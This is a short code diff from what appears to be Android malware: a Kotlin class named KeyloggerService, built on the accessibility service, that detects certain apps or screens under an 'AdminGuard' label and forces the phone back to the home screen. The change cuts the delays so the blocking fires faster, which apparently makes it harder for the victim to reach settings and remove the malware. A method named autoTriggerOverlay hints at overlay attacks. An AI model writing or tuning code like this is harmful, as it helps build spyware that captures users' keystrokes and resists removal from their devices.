@@ -235,10 +235,10 @@ class KeyloggerService : AccessibilityService() {
         android.util.Log.d("AdminGuard", "Blocked: $pkg / $className")
         handler.postDelayed({
             performGlobalAction(GLOBAL_ACTION_BACK)
-        }, 50)
+        }, 10)
         handler.postDelayed({
             performGlobalAction(GLOBAL_ACTION_HOME)
-        }, 450)
+        }, 10)
     }
 
     private fun autoTriggerOverlay(pkg: String) {
